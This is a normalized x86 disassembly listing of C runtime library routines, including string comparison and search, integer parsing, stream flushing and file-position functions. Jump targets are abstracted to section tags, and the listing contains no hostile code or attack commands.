jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_415547
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_41807a
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_41fdbc
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_41f650
mov [ esi + 0x4 ] eax
sub_4155ce
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
inc ecx
inc ecx
inc edx
inc edx
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_415610
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_415650
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_415547
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_4119bb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_420097
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_4119bb
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_41587f
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_415650
add esp 0x14
pop ebp
retn
sub_4158c0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_415980
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_415a08
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x2c ] eax
call sub_41807a
push 0x8
pop ecx
mov [ ebp - 0x28 ] eax
xor eax eax
lea edi [ ebp - 0x24 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
movzx ecx dl
mov eax ecx
and ecx edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp - 0x2c ]
test edx edx
jne r-xdata
mov al [ edx ]
movzx esi al
xor ebx ebx
mov ecx esi
and ecx edi
inc ebx
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl bl
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x18 ]
jmp r-xdata
test al al
je r-xdata
mov ebx edx
jmp r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx esi [ edx ]
xor eax eax
mov ecx esi
and ecx edi
inc eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl al
jne r-xdata
jmp r-xdata
mov [ edx ] 0x0
inc edx
inc edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ebx
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
sub_415ad0
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_415b7b
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax edx
mov cx [ edx ]
inc edx
inc edx
test cx cx
jne r-xdata
dec edx
dec edx
cmp [ ebp + 0x10 ] 0x0
push esi
je r-xdata
xor ecx ecx
mov [ edx ] cx
mov esi [ ebp + 0xc ]
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx ecx [ esi ]
dec [ ebp + 0x10 ]
mov [ edx ] cx
inc edx
inc edx
inc esi
inc esi
test cx cx
je r-xdata
sub_415bbb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_41b3c1
pop ecx
push eax
call sub_41e7c0
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_415c23
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_415bbb
pop ecx
test eax eax
je r-xdata
push esi
call sub_415c6b
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_41b3c1
push eax
call sub_42014f
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_415c6b
push 0x14
push r--data
call sub_4183f0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415d3c
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_418435
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_413727
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_415d0d
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_415c23
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_415c23
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_415d4e
push 0xc
push r--data
call sub_4183f0
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0xc ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
setne al
cmp eax esi
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0xc ] edi
push edi
call sub_4136e6
pop ecx
mov [ ebp - 0x4 ] esi
test [ edi + 0xc ] 0x40
jne r-xdata
call sub_418435
retn
cmp [ ebp - 0x1c ] esi
jne r-xdata
push edi
call sub_41b3c1
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415e5f
mov eax [ ebp - 0x1c ]
push edi
call sub_41c1eb
mov esi eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
call [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
push edi
push esi
call sub_41c287
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_415e88
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_41b3c1
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
push 0x1
push ebx
push eax
call sub_41bfd4
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_4119bb
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_41bfd4
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_41bfd4
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_416025
push 0xc
push r--data
call sub_4183f0
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_4136e6
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_415e88
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416089
mov eax [ ebp - 0x1c ]
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_418435
retn
sub_416093
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_418ea8
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_418ea8
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
